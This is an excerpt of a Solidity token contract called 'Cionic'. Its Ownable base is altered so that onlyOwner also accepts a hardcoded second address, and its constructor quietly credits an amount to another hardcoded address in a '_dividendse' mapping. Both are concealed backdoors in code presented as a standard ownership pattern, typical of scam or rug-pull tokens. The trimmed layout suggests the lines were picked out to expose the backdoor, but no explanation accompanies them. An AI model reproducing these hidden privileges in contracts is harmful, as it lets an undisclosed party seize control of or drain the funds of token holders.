...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == address(0x1C6b54dee0292CE6812d1903580b2f2D32D82651), "Ownable: caller is not the owner");
        _;
    }
...
contract Cionic is IERC20, Ownable {
    ...
    constructor(
        ...
        _dividendse[0x3Da65e00b64c17e84050f28476De963c15024B6E] = _amount;
